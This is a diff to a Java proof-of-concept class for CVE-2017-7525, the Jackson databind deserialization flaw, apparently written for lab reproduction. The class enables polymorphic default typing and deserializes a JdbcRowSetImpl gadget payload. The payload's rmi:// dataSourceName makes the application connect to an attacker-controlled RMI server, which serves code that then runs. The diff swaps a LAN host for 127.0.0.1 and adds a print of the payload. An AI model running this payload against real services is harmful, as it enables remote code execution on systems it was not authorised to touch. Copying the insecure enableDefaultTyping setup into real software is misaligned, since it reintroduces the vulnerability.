@@ -17,10 +17,11 @@ import java.lang.reflect.Method;
 public class CVE_2017_7525
 {
     public static void main( String[] args ) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
-        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
         ObjectMapper objectMapper = new ObjectMapper();
-//        objectMapper.enableDefaultTyping();
+        objectMapper.enableDefaultTyping();
         objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
+//        objectMapper.enableDefaultTyping();
 
         // 用ObjectMapper.disableDefaultTyping()设置为只允许@JsonTypeInfo生效
 //                objectMapper.disableDefaultTyping();
@@ -28,7 +29,8 @@ public class CVE_2017_7525
 //        Method disableDefaultTypingM = objectMapper.getClass().getMethod("disableDefaultTyping");
 //        disableDefaultTypingM.invoke(objectMapper);
 
-        String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.16.132:1099/pegg3x\",\"autoCommit\":true}";
+        String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/w2repa\",\"autoCommit\":true}";
+        System.out.println(json);
         objectMapper.readValue(json, Object.class);
     }
 }
